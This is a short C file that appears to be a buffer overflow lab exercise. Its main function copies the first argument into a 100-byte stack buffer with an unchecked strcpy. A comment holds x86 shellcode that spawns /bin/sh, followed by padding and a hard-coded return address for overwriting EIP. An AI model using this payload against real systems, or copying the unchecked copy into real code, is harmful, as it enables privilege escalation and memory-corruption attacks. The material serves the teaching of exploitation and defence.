// char code[] = // spawn a shell
//               "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
//               "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
//               "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
//               "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
//               "\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42" 
//               // exit cleanly
//               "\x31\xc0\x83\xc8\x01\x31\xdb\xcd\x80"
//               // padding
//               "AAAAAAAA"
//               // address to stick into eip (address of beginning of  buf)
//               // note: this is in little endian
//               "\xd4\xf2\xff\xbf";

int main(int argc, char *argv[])
{
   // int (*func)();
   // func = ( int (*)() ) code;
   // (int)(*func)();

   char buf[100];
   strcpy( buf, argv[1] );
   return 0;
}
